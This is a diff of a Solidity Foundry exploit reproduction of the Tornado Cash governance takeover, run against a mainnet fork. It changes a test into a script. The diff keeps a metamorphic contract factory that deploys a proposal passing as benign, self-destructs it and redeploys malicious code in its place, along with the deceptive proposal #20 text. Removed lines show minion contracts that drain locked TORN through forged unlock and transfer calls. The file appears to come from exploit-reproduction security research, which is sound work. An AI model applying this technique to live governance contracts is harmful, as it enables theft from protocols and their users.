@@ -2,6 +2,8 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
+import "forge-std/Script.sol";
+
 import {TestHarness} from "../../TestHarness.sol";
 import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
 import {IERC20} from "../../interfaces/IERC20.sol";
@@ -9,125 +11,73 @@ import {IWETH9} from "../../interfaces/IWETH9.sol";
 import {Ownable} from "./AttackerOwnable.sol";
 import "./TornadoGovernance.interface.sol";
 
-contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
+contract Exploit_TornadoCashGovernanceS is Script, TestHarness, TokenBalanceTracker {
     IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
-    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);
 
     address ATTACKER1 = makeAddr("Attacker1");
     address ATTACKER2 = makeAddr("Attacker2");
-
-    Attacker1Contract attacker1contract;
 
     ReinitializableContractFactory proposalFactory;
     TransientContract transientContract;
     Proposal_20 proposal_20;
 
-    function setUp() external {
-        cheat.createSelectFork("mainnet", 17_249_476); // One block before the step 0. happens.
+    function setUp() public {
+        cheat.createSelectFork("mainnet", 17249477); // The block where the step 0. happens.
 
         // The attacker used two accounts
         cheat.deal(ATTACKER1, 0.5 ether);
-        cheat.deal(ATTACKER2, 10 ether); // https://etherscan.io/tx/0xf93536162943bd36df11de6ed11233589bb5f139ff4e9e425cb5256e4349a9b4
+        cheat.deal(ATTACKER2, 0.5 ether);
 
-        //  This contract would play only the role of coordinating attacks
+        //  This contract would play the role of the Attacker Contract
         cheat.deal(address(this), 0.5 ether);
 
         _labelAccounts();
         _tokenTrackerSetup();
     }
 
-    function test_attack() external {
-        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL - GET SOME TORN ========");
+    function run() external {
+        setUp();
+
+        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL ========");
         // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
-        vm.startPrank(ATTACKER2);
         _deployFactoryAndProposal();
-        cheat.rollFork(17_248_593);
-        _swapEthForTorn();
-        _initialTornLock();
-        vm.stopPrank();
-
-        console2.log("\n======== STEP 1. SUBMIT MALICIOUS PROPOSAL ========");
-        // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
-        // Attacker 2
-        // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
-        cheat.rollFork(17_249_552);
-        console2.log("Submitting proposal...");
-        vm.startPrank(ATTACKER2);
-        TORNADO_GOVERNANCE.propose(
-            address(proposal_20),
-            '{"title":"Proposal #20: Relayer registry penalization","description":"Penalize following relayers who is cheating the protocol.\nThe staked balances of these relayers are not burned at all, so the staking reward of valid participants are not properly paid.\n\n0xcBD78860218160F4b463612f30806807Fe6E804C tornadope.eth\n0x94596B6A626392F5D972D6CC4D929a42c2f0008c 0xgm777.eth\n0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4 0xtorn365.eth\n0x18F516dD6D5F46b2875Fd822B994081274be2a8b abc321.eth\n\nUse same logic of proposal #16."}'
-        );
-        vm.stopPrank();
-
-        console2.log("\n======== STEP 2. DEPLOY AND PREPARE MULTIPLE ACCOUNTS ========");
-        // 2. Deploy multiple minion contracts with the Attacker Contract and lock zero TORN with
-        // each
-        // one in the Governance with the Attacker 2
-        // https://explorer.phalcon.xyz/tx/eth/0x26672ad9140d11b64964e79d0ed5971c26492786cfe0edf57034229fdc7dc529?line=835&debugLine=835
-        cheat.rollFork(17_285_354);
-        vm.startPrank(ATTACKER1);
-        attacker1contract = new Attacker1Contract();
-        attacker1contract.deployMultipleContracts(5);
-        vm.stopPrank();
 
         console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
         // 3. Selfdestruct both the proposal and transient contract
         // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0
         vm.prank(ATTACKER2);
         proposalFactory.emergencyStop();
-    }
-
-    function _swapEthForTorn() internal {
-        // We emulate the swap with a token deal (getting 1017 TORN)
-        // Swap 1 https://etherscan.io/tx/0x82dca5a88a43377cab4748073a3a46c8aa120d42c5c5d802789cf17df22f0acd
-        // Swap 2 https://etherscan.io/tx/0x6d3445d633de3d9c9dfdd4ca75cab9ff2cd269ec6d124baf2cd11cd177d04850
-        deal(address(tornToken), ATTACKER2, 1017 ether);
-        assertEq(tornToken.balanceOf(ATTACKER2), 1017 ether, "torn token balance mismatch");
-    }
-
-    function _initialTornLock() internal {
-        // The attacker first approves with type(uint256).max
-        tornToken.approve(address(TORNADO_GOVERNANCE), type(uint256).max);
-
-        // Then locks with approval
-        TORNADO_GOVERNANCE.lockWithApproval(tornToken.balanceOf(ATTACKER2));
+        console2.log("WOLOLO");
+        console2.log(address(proposal_20).code.length);
+        // cheat.etch(address(proposal_20), new bytes(0));
+        // console2.log(address(proposal_20).code.length);
     }
 
     function _deployFactoryAndProposal() internal {
+        vm.startPrank(ATTACKER2);
+
         // Deploy the factory
         proposalFactory = new ReinitializableContractFactory(type(TransientContract).creationCode);
         console2.log("Proposal Factory deployed at: %s", address(proposalFactory));
 
         // Deploy the proposal through a transient
-        (address proposal, address transient) = proposalFactory.createProposalWithTransient(
-            bytes32(bytes20(ATTACKER2)), type(Proposal_20).creationCode
-        );
+        (address proposal, address transient) =
+            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), type(Proposal_20).creationCode);
 
         proposal_20 = Proposal_20(proposal);
         transientContract = TransientContract(transient);
 
         // Check the transient contract with a read method:
-        address preCalcTransientContract =
-            proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));
+        address preCalcTransientContract = proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));
 
         assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
         assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");
 
         console2.log("Transient deployed at: %s", address(transientContract));
         console2.log("Proposal 20 deployed at: %s", address(proposal_20));
+        vm.stopPrank();
     }
-
-    // 4. Re deploy the transient and the new malicious proposal
-    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
-
-    // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
-    // mentioned in the proposal #20 description)
-    // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
-
-    // 6. On each of the previously deployed minion, drain the governance by calling unlock() and
-    // transfer() the TORN tokens to the Attacker 1, coordinated by the Attacker Contract
-    // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
 
     function _labelAccounts() internal {
         cheat.label(address(tornToken), "TORN");
@@ -146,8 +96,8 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
 
 // Factory capable of deploying contracts that selfdestruct changing their implementation
 // using a combination of create2 and create with a transient contract
-// Deployed at tx:
-// https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
+// Deployed at tx: https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
+
 // Heavily inspired by 0age Metamorphic contracts: https://github.com/0age/metamorphic/
 contract ReinitializableContractFactory is Ownable {
     bytes _transientContractInitializationCode;
@@ -162,8 +112,7 @@ contract ReinitializableContractFactory is Ownable {
         _transientContractInitializationCode = transientContractInitializationCode;
 
         // calculate and assign keccak256 hash of transient initialization code.
-        _transientContractInitializationCodeHash =
-            keccak256(abi.encodePacked(_transientContractInitializationCode));
+        _transientContractInitializationCodeHash = keccak256(abi.encodePacked(_transientContractInitializationCode));
     }
 
     function emergencyStop() external onlyOwner {
@@ -189,12 +138,9 @@ contract ReinitializableContractFactory is Ownable {
         _;
     }
 
-    // This function implements the logic behind the deployment for a proposal via a transient
-    // contract
-    // First, the transient contract is deployed with Create2 and then the latter deploys the
-    // proposal with Create
-    // More details:
-    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
+    // This function implements the logic behind the deployment for a proposal via a transient contract
+    // First, the transient contract is deployed with Create2 and then the latter deploys the proposal with Create
+    // More details: https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
     // Method called after: 0xce40d339 in the attacker's contract factory
     /// @dev base impl by 0age
     function createProposalWithTransient(bytes32 salt, bytes memory proposalInitializationCode)
@@ -326,8 +272,7 @@ contract TransientContract is Ownable {
     }
 
     // The attacker named this function after "emergencyStop"
-    // More details:
-    // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
+    // More details: https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
     // This call first triggers the destruction of the Proposal and then its own.
     function emergencyStop() external onlyOwner {
         IMaliciousSelfDestruct(proposal).emergencyStop(); // Destroy the proposal
@@ -337,9 +282,7 @@ contract TransientContract is Ownable {
 }
 
 // This was a benign proposal previously executed and the one referenced as the attacker
-// The attacker claimed that his proposal had this very same implementation but targeting different
-// relayers
-// https://etherscan.io/address/0xd4b776caf2a39aeceb21a5dd7812082e2391b03d#code
+// The attacker claimed that his proposal had this very same implementation but targeting different relayers
 contract Proposal_16 is IProposal {
     function getNullifiedTotal(address[13] memory relayers) public returns (uint256) {
         uint256 nullifiedTotal;
@@ -396,8 +339,7 @@ contract Proposal_16 is IProposal {
     }
 }
 
-// The initial malicious proposal implementation could be debugged here:
-// https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=3&debugLine=3
+// The initial malicious proposal implementation could be debugged here: https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=3&debugLine=3
 contract Proposal_20 is Ownable {
     function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
         uint256 nullifiedTotal;
@@ -435,73 +377,5 @@ contract Proposal_20 is Ownable {
     function emergencyStop() public onlyOwner {
         console2.log("Destroying proposal...");
         selfdestruct(payable(0));
-    }
-}
-
-contract Attacker1Contract {
-    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
-    address[] minionContracts;
-
-    function deployMultipleContracts(uint256 amount) external {
-        address newMinion;
-        for (uint256 i = 0; i < amount;) {
-            console2.log("Deploying and preparing minion #%s", i + 1);
-            newMinion = address(new Attacker1Minion());
-            minionContracts.push(newMinion);
-
-            tornToken.transferFrom(msg.sender, newMinion, 0);
-            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
-            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);
-
-            unchecked {
-                ++i;
-            }
-        }
-    }
-
-    function triggerUnlock() external {
-        uint256 amountOfMinions = minionContracts.length;
-        for (uint256 i = 0; i < amountOfMinions;) {
-            address currentMinion = minionContracts[i];
-            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.UNLOCK);
-            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.TRANSFER);
-
-            unchecked {
-                ++i;
-            }
-        }
-    }
-}
-
-contract Attacker1Minion {
-    enum AttackInstruction {
-        APPROVE,
-        LOCK,
-        UNLOCK,
-        TRANSFER
-    }
-
-    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
-    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);
-
-    address owner;
-
-    constructor() {
-        owner = msg.sender;
-    }
-
-    // this function has the signature 0x93d3a7b6 on each minion contract
-    // The attacker calls this function many times but with different traces, meaning that has some
-    // type of control flow
-    function attackTornado(AttackInstruction instruction) external {
-        if (instruction == AttackInstruction.APPROVE) {
-            tornToken.approve(address(TORNADO_GOVERNANCE), 0);
-        } else if (instruction == AttackInstruction.LOCK) {
-            TORNADO_GOVERNANCE.lockWithApproval(0);
-        } else if (instruction == AttackInstruction.UNLOCK) {
-            TORNADO_GOVERNANCE.unlock(10_000 ether); // 10000000000000000000000
-        } else if (instruction == AttackInstruction.TRANSFER) {
-            tornToken.transfer(owner, 10_000 ether);
-        }
     }
 }
